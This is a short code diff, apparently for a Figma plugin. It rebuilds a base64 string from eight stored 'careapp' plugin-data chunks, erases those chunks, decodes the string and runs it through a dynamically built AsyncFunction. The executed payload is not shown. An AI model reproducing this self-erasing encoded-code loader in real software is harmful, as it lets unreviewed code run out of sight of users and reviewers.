@@ -1,0 +1,14 @@
+const b64=figma.root.getSharedPluginData("careapp","full14_0")+figma.root.getSharedPluginData("careapp","full14_1")+figma.root.getSharedPluginData("careapp","full14_2")+figma.root.getSharedPluginData("careapp","full14_3")+figma.root.getSharedPluginData("careapp","full14_4")+figma.root.getSharedPluginData("careapp","full14_5")+figma.root.getSharedPluginData("careapp","full14_6")+figma.root.getSharedPluginData("careapp","full14_7");
+figma.root.setSharedPluginData("careapp","full14_0","");
+figma.root.setSharedPluginData("careapp","full14_1","");
+figma.root.setSharedPluginData("careapp","full14_2","");
+figma.root.setSharedPluginData("careapp","full14_3","");
+figma.root.setSharedPluginData("careapp","full14_4","");
+figma.root.setSharedPluginData("careapp","full14_5","");
+figma.root.setSharedPluginData("careapp","full14_6","");
+figma.root.setSharedPluginData("careapp","full14_7","");
+const raw=atob(b64);
+let code="";
+for (let i=0;i<raw.length;i++) code+=String.fromCharCode(raw.charCodeAt(i)&0xff);
+const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
+return await new AsyncFunction(code)();
